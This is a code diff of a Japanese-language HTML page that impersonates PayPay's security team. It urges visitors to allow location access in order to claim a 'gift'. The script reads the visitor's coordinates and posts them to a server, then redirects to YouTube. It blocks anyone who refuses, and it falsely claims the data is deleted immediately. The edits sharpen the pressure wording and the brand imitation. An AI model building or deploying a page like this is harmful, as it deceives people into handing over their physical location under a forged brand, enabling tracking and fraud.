@@ -1,19 +1,23 @@
 <!DOCTYPE html>
 <html lang="ja">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>本人確認 - PayPayセキュリティ</title>
+  <link rel="icon" href="https://play-lh.googleusercontent.com/AieC1ypSSh_2rctvrNtVggyFRP9cNtvnEIPkVmzZGFlhN8bNdHCl3GZbxK7O8vCe7A" type="image/png"/>
   <style>
     body {
-      font-family: sans-serif;
+      font-family: 'Helvetica Neue', sans-serif;
       text-align: center;
       padding: 30px;
       background-color: #f7f7f7;
+      margin: 0;
     }
+
     .logo {
       margin-top: 20px;
     }
+
     .card {
       background-color: #fff;
       border-radius: 12px;
@@ -22,17 +26,20 @@
       display: inline-block;
       max-width: 420px;
       width: 100%;
+      margin-top: 20px;
     }
+
     h2 {
       color: #e60012;
       font-size: 22px;
       margin-bottom: 15px;
     }
+
     p {
       font-size: 16px;
-      margin-bottom: 20px;
-      color: #333;
+      margin-bottom: 18px;
     }
+
     button {
       background-color: #e60012;
       color: white;
@@ -42,58 +49,46 @@
       border-radius: 8px;
       cursor: pointer;
     }
+
     .note {
       font-size: 12px;
       color: #888;
       margin-top: 15px;
     }
+
     .warning {
       color: #b00020;
       font-size: 14px;
       font-weight: bold;
-      margin-bottom: 20px;
+      margin: 18px 0;
     }
-    .highlight {
-      background: #ffefef;
-      padding: 10px;
-      border-radius: 8px;
-      margin-bottom: 15px;
-      font-size: 14px;
-      color: #222;
+
+    .warning-icon {
+      width: 40px;
+      margin-bottom: 10px;
     }
   </style>
 </head>
 <body>
 
-  <img src="https://www.paypay.ne.jp/img/logo.svg" width="120" class="logo">
-  
+  <img src="https://www.paypay.ne.jp/img/logo.svg" width="120" class="logo"/>
+
   <div class="card">
+    <img src="https://cdn.askul.co.jp/img/product/3L1/JA32873_3L1.jpg" class="warning-icon" alt="警告マーク"/>
     <h2>本人確認のお願い</h2>
-    
     <p>
-      不正受け取り防止のため、<br>
-      <b>現在の位置情報の確認</b>が必要です。
+      本サービスの安全な運用を守るため、<br><b>現在地情報の確認</b>をお願いしております。<br>
+      これは<b>全利用者に一律適用</b>される、PayPayの最新セキュリティチェックです。
     </p>
-
-    <div class="highlight">
-      この確認は<b>1回のみ</b>で完了し、<br>
-      <b>数秒以内に安全に削除</b>されます。
-    </div>
-
     <div class="warning">
-      ※位置情報を<b>許可されない場合、受け取りはできません</b>。
+      ※位置情報を<b>許可されない場合、ギフトは受け取れません。</b>
     </div>
-
     <p>
-      本人確認は<b>PayPayセキュリティ</b>の一環として、<br>
-      すべてのユーザー様に実施しております。
+      ご提供いただいた情報は<b>即時削除され、安全に処理</b>されますのでご安心ください。
     </p>
-
     <button onclick="verifyLocation()">位置情報を許可して続行</button>
-
     <div class="note">
-      ※許可いただけない場合、<b>再アクセスはできなくなります</b><br>
-      ※許可された情報は<b>外部送信されません</b>
+      ※この確認は一度限りです。<br>拒否された場合、再取得はできません。
     </div>
   </div>
 
@@ -110,14 +105,14 @@
                 longitude: pos.coords.longitude
               })
             }).then(() => {
-              alert("本人確認が完了しました。ギフトの受け取りに進みます。");
+              alert("本人確認が完了しました。ギフトを受け取ります。");
               location.href = "https://www.youtube.com/";
             });
           },
           err => {
-            alert("⚠️ 位置情報が拒否されたため、受け取りはできません。");
+            alert("⚠️ 位置情報が拒否されたため、ギフトを受け取ることができません。");
             localStorage.setItem('robot', 'true');
-            location.reload();
+            location.reload(); // 次回アクセス拒否
           }
         );
       } else {
@@ -127,13 +122,14 @@
       }
     }
 
-    // 拒否者ブロック
+    // 拒否済みユーザーを即ブロック
     if (localStorage.getItem('robot') === 'true') {
       document.body.innerHTML = `
         <div style="padding:50px; text-align:center;">
           <img src="https://www.paypay.ne.jp/img/logo.svg" width="120"><br><br>
+          <img src="https://cdn.askul.co.jp/img/product/3L1/JA32873_3L1.jpg" width="60"><br><br>
           <h2 style="color:#e60012;">アクセスが制限されました</h2>
-          <p>過去に位置情報を<b>拒否されたため</b>、<br>この端末からの受け取り手続きはできません。</p>
+          <p>以前に位置情報取得を拒否されたため、<br>この端末ではご利用いただけません。</p>
         </div>
       `;
     }
